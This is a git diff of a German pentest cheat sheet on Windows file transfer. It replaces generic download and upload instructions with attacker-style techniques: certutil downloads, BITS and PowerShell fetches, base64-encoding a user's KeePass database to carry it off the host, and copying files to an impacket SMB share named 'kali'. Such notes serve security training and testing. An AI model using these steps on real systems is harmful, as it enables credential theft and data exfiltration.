@@ -300,117 +300,53 @@ Eigene PowerShell-ExecutionPolicy anzeigen:
 
 ## File Transfer:
 
-### CMD: Dateien downloaden
+### CMD:
 
-1. curl (ab Windows 10/11)
-   ```
-   curl -o <Ziel-Datei> <URL>
-   ```
-   Beispiel:
-   ```
-   curl -o file.zip http://example.com/file.zip
-   ```
+Curl:
+```cmd
+curl 127.0.0.1 -o file
+```
 
-2. bitsadmin (ältere Windows-Versionen)
-   ```
-   bitsadmin /transfer myDownloadJob /download /priority normal <URL> <Ziel-Datei>
-   ```
-   Beispiel:
-   ```
-   bitsadmin /transfer myjob /download /priority normal http://example.com/file.zip C:\file.zip
-   ```
+```cmd
+bitsadmin /transfer jobname /download /priority normal "http://example.com/datei.zip" "C:\Pfad\datei.zip"
+```
 
-3. wget (muss installiert sein)
-   ```
-   wget <URL> -O <Ziel-Datei>
-   ```
-   Beispiel:
-   ```
-   wget http://example.com/file.zip -O file.zip
-   ```
+```cmd
+certutil -urlcache -split -f "http://example.com/datei.zip" "datei.zip"
+```
 
-4. PowerShell aus CMD heraus
-   ```
-   powershell -c "Invoke-WebRequest -Uri '<URL>' -OutFile '<Ziel-Datei>'"
-   ```
-   Beispiel:
-   ```
-   powershell -c "Invoke-WebRequest -Uri 'http://example.com/file.zip' -OutFile 'file.zip'"
-   ```
+Powershell:
+```powershell
+Invoke-WebRequest "http://url_zur_datei" -OutFile "lokaler_Pfad\Dateiname"
+```
 
-### CMD: Dateien hochladen
+```powershell
+wget "http://url_zur_datei" -OutFile "lokaler_Pfad\Dateiname"
+```
 
-1. FTP (eingebaut)
-   ```
-   ftp
-   open <Server>
-   user <Benutzername> <Passwort>
-   put <lokale_Datei>
-   quit
-   ```
+```powershell
+Start-BitsTransfer -Source "http://url_zur_datei" -Destination "lokaler_Pfad\Dateiname"
+```
 
-2. SFTP (wenn installiert, z.B. mit OpenSSH)
-   ```
-   sftp <Benutzer>@<Server>
-   put <lokale_Datei>
-   exit
-   ```
+```powershell
+[convert]::ToBase64String((Get-Content -path "C:\users\bob\documents\Database.kdbx"
+-Encoding byte))
+```
 
-3. curl (HTTP POST, wenn Server es unterstützt)
-   ```
-   curl -F "file=@<lokale_Datei>" <Upload-URL>
-   ```
+=>
+```bash
+echo "A9mimmf7S7UBAAMAAhAAMcHy5r9xQ1C+WAUhavxa/wMEAAEAAAAEIADwMjakIrOmKjXoiAtsOFsZrOMd
+…
+ChKxkL40QoEcNR4lulm6spUfDOfD5NZTxcMJnPTtJqqgdzOnUzUB/QGlCspNFaCyNCuVsZFdBIqAQsb9CJOANu
+TsZNa3y67DOFi0BRDx9T2RC7L87ZPx4lsGdiKNV6D1Oda3D+L+F6kJHJ1TYfwPIzpxaZRYpCDzRtFgMc4JD4qA
+==" | base64 -d > database.kdbx
+```
 
-4. scp (wenn installiert, z.B. mit OpenSSH)
-   ```
-   scp <lokale_Datei> <Benutzer>@<Server>:<Zielpfad>
-   ```
+SMB:
+```bash
+impacket-smbserver -smb2support kali .
+```
 
-### PowerShell: Dateien downloaden
-
-1. Invoke-WebRequest
-   ```
-   Invoke-WebRequest -Uri "<URL>" -OutFile "<Ziel-Datei>"
-   ```
-
-2. System.Net.WebClient
-   ```
-   $client = New-Object System.Net.WebClient
-   $client.DownloadFile("<URL>", "<Ziel-Datei>")
-   ```
-
-3. Start-BitsTransfer
-   ```
-   Start-BitsTransfer -Source "<URL>" -Destination "<Ziel-Datei>"
-   ```
-
-4. curl (ab PowerShell 6, Alias für Invoke-WebRequest oder echtes curl)
-   ```
-   curl -o "<Ziel-Datei>" <URL>
-   ```
-
-### PowerShell: Dateien hochladen
-
-1. FTP-Upload via System.Net.WebClient
-   ```
-   $client = New-Object System.Net.WebClient
-   $client.Credentials = New-Object System.Net.NetworkCredential("Benutzer", "Passwort")
-   $client.UploadFile("ftp://<Server>/<Ziel-Datei>", "<lokale_Datei>")
-   ```
-
-2. Invoke-RestMethod (HTTP POST, z.B. für Webserver)
-   ```
-   Invoke-RestMethod -Uri "<Upload-URL>" -Method Post -InFile "<lokale_Datei>" -ContentType "multipart/form-data"
-   ```
-
-3. SFTP mit Posh-SSH-Modul (Modul muss installiert werden)
-   ```
-   New-SFTPSession -ComputerName <Server> -Credential (Get-Credential)
-   Set-SFTPFile -SessionId 0 -LocalFile "<lokale_Datei>" -RemotePath "<Zielpfad>"
-   ```
-
-4. FTP-Upload via klassischem FTP-Client (aus PowerShell heraus)
-   ```
-   ftp -s:ftp_script.txt
-   ```
-   (ftp_script.txt enthält die FTP-Befehle wie oben bei CMD)
+```powershell
+copy file \\127.0.0.1\kali
+```
